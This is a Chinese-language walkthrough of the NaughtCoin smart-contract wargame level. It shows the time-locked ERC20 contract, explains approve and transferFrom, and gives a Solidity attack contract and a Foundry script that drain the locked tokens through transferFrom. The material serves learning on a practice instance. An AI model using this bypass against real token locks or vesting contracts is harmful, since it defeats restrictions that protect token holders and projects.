# Naughtcoin ERC20approve授权

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(
        address _to,
        uint256 _value
    ) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}

```

## ERC20的approve授权

ERC20的转账有两种方式:

### 1.`transfer`

* \*\*transfer(address to, uint256 amount)  \*\*

前提自己就是token的拥有者

### 2.`approve`+`transferFrom`

* \*\*approve(address spender, uint256 amount)  \*\*

`spender`是被授权的人,`amount`是授权最多可以支配多少钱

* \*\*  transferFrom(address from, address to, uint256 amount)  \*\*

**重点是,****调用transferfrom的人****&#x5FC5;须被approve授权过**

以本题为例,我们不能`transfer`,那就是`approve`+`transferFrom`:

`approve`授权攻击合约支配token的权利(这一步需要在脚本里,先授权再调用`attack()`)

**被授权后的攻击合约调用transferFrom()**,这个时候`from`就是我们的钱包,`to`是谁**不重要**,`amount`就调用ERC20的`blananceOf()`,有多少token全部转走

注意在靶场部署后,有token的是我们的小狐狸钱包,所以`transferFrom`的`from`是小狐狸钱包地址,不是实例地址哈,但是脚本部署的时候是部署实例地址的

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;
//0x000fd11cB8828791DF5BF5DA721D179105F3b712
import {NaughtCoin} from "./Naughtcoin.sol";

contract Attack {
    NaughtCoin public naughtcoin;

    constructor(address addr) {
        naughtcoin = NaughtCoin(addr);
    }

    function attack() external {
        naughtcoin.transferFrom(
            0x98707a8Cb53bD823f9c5353611018aF38533adE5,
            address(11000000000000000),
            naughtcoin.balanceOf(0x98707a8Cb53bD823f9c5353611018aF38533adE5)
        );
        require(
            naughtcoin.balanceOf(0x98707a8Cb53bD823f9c5353611018aF38533adE5) ==
                0,
            "no"
        );
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";
import "../src/Naughtcoin.sol";

contract Attacksc is Script {
    NaughtCoin public naughtCoin;

    function run() external {
        vm.startBroadcast();
        naughtCoin = NaughtCoin(0x000fd11cB8828791DF5BF5DA721D179105F3b712);
        Attack attack = new Attack(0x000fd11cB8828791DF5BF5DA721D179105F3b712);
        naughtCoin.approve(address(attack), type(uint256).max);
        attack.attack();
        vm.stopBroadcast();
    }
}

```


> 更新: 2025-07-11 16:05:31  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/kur8ugq8r9yn3yq7>